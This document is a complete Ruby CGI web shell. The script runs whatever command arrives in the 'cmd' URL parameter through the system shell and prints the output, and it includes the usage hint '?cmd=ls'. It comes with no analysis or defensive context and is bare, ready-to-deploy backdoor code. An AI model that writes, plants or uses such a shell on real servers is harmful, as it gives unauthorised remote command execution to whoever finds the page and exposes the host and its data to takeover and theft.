#!/usr/bin/env ruby

require 'cgi'
cgi = CGI.new
print cgi.header

cmd = cgi['cmd']
if cmd && !cmd.empty?
  puts "<pre>#{`#{cmd}`}</pre>"
else
  puts "Usage: ?cmd=ls"
end
